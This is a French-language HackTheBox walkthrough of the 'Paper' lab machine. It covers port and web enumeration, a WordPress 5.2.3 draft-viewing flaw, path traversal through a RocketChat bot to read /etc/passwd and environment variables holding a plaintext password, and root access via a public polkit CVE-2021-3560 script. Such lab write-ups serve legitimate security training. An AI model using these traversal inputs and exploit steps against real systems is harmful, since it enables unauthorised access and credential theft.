---
title: HTB | Paper
description: Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to CVE-2019-17671. This vulnerability allows us to view the confidential information stored in the draft posts of the blog, which reveal another URL leading to an employee chat system. This chat system is based on Rocketchat. Reading through the chats we find that there is a bot running which can be queried for specific information. We can exploit the bot functionality to obtain the password of a user on the system. Further host enumeration reveals that the sudo version is vulnerable to CVE-2021-3560 and can be exploited to elevate to root privileges.
slug: paper-htb
date: 2025-02-01 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Paper cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Paper</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.143</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -p- -vvv -T4 10.10.11.143
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 06:38 EST
...
...
Nmap scan report for 10.10.11.143
Host is up, received echo-reply ttl 63 (0.018s latency).
Scanned at 2025-01-24 06:38:11 EST for 35s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| tls-alpn: 
|_  http/1.1
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a:92bd:803c:ac47:d49c:5add:e44e:4f84
| SHA-1: 61a2:301f:9e5c:2603:a643:00b5:e5da:5fd5:c175:f3a9
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
| mh/ptg==
|_-----END CERTIFICATE-----
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
```

## Foothold

### office.paper
En utilisant burp, on observe une réponse HTTP avec le header "Backend-server: office.paper". En l'ajoutant a /etc/hosts, on accède à une nouvelle page web.

### dirsearch
```bash
 gobuster dir -u http://office.paper -t 50 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://office.paper
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 235] [--> http://office.paper/manual/]
/index.php            (Status: 301) [Size: 1] [--> http://office.paper/]
/wp-admin             (Status: 301) [Size: 237] [--> http://office.paper/wp-admin/]
/wp-content           (Status: 301) [Size: 239] [--> http://office.paper/wp-content/]
/wp-includes          (Status: 301) [Size: 240] [--> http://office.paper/wp-includes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### wordpress
On observe avec dirsearch une page de login wordpress --> /wp-admin

### wp-scan
On observe :
WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
```bash
$ wpscan --url http://office.paper                
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Thu Jan 30 10:22:59 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan 30 10:23:06 2025
[+] Requests Done: 169
[+] Cached Requests: 5
[+] Data Sent: 42.416 KB
[+] Data Received: 167.972 KB
[+] Memory used: 280.184 MB
[+] Elapsed time: 00:00:07
```

### Viewing unauthenticated posts.md
http://office.paper/?static=1&order=desc

Permet d'afficher des messages cachés normalement non accessible. C'est une vulnerabilité de wordpress 5.2.3 :

Vuln:
**Wordpress <=5.2.3: viewing unauthenticated posts.md**

On trouve le message suivant qui semble intéressant :
```bash
## Secret Registration URL of new Employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY
```

On arrive sur une page, où l'on peut créer un compte rapidement et on obtient l'accès à une sorte de discord avec un chat:
L'application RocketChat.

### RocketChat bot

En fouillant on voit qu'il existe un profil avec un bot, on peut discuter avec lui. Avec la commande help on voit une commande qui permet d'afficher des fichiers. Cette commande fait appelle à `cat` pour afficher n'importe quel fichier. On peut utiliser cette commande comme une LFI pour afficher le contenu de n'importe quel fichier :

```bash
recyclops file test.txt

cat: /home/dwight/sales/test.txt: No such file or directory

recyclops file ../../../etc/passwd

 <!=====Contents of file ../../../etc/passwd=====>
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12💯games:/usr/games:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd❌998:996:User for polkitd:/:/sbin/nologin
geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
qemu❌107:107:qemu user:/:/sbin/nologin
apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
chrony❌993:987::/var/lib/chrony:/sbin/nologin
libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
radvd❌75:75:radvd user:/:/sbin/nologin
clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
sssd❌983:981:User for sssd:/:/sbin/nologin
colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm❌42:42::/var/lib/gdm:/sbin/nologin
gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
tcpdump❌72:72::/:/sbin/nologin
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod❌976:974:mongod:/var/lib/mongo:/bin/false
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
<!=====End of file ../../../etc/passwd=====>
```

### /proc/self/environ: Environment variables
On peut afficher les variables d'environnements (et d'autres infos) grâce aux fichiers présents dans /proc/self :

```bash
recyclops file ../../../proc/self/cmdline
#################################################

Bot
7:05 PM
<!=====Contents of file ../../../proc/self/cmdline=====>
cat/home/dwight/sales/../../../proc/self/cmdline
<!=====End of file ../../../proc/self/cmdline=====>

recyclops file ../../../proc/self/environ
#################################################

Bot
7:07 PM
<!=====Contents of file ../../../proc/self/environ=====>
RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat
<!=====End of file ../../../proc/self/environ=====>
```
On obtient les creds de rocketchat sur la plateforme rocket.chat
rocketchat : `Queenofblad3s!23`

Après vérification, on ne peut pas se connecter en ssh avec cet utilisateur et ce mot de passe. Les creds marchent sur la plateforme web mais un message nous indique qu'il est interdit de se connecter à l'interface web avec un bot.

### SSH : dwight
Le mot de passe de rocketchat fonctionne pour l'utilisateur dwight en ssh:
dwight : `Queenofblad3s!23`
```bash
ssh dwight@office.paper         
dwight@office.paper's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Thu Jan 30 18:24:37 EST 2025 from 10.10.14.42 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ cat user.txt
4419.....697b
```

## Privilege Escalation

### CVE-2021-3560 : polkit
Avec linpeas, on trouve une elevation de privilege grâce à une faille dans l'outil polkit, `CVE-2021-3560`
```bash
./linpeas.sh
...
Vulnerable to CVE-2021-3560
...
```
On trouve un poc sur github avec un script .sh :
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

Au début il ne fonctionne pas, le mot de passe du nouveau user crée doit etre équivalent a l'actuel mais ça n'était pas le cas. En précisant le parametre -p=a, l'exploit fonctionne, pas de problème. (Je précise car j'ai abandonné cette CVE à cause de ça... Je pensais que ce n'était pas la solution de la boxe.)
```bash
[dwight@paper ~]$ ./exploit.sh -p=a
[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su - secnigma
Password: 
[secnigma@paper ~]$ whoami
secnigma
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]# cat /root/root.txt 
ccbf.....2804
```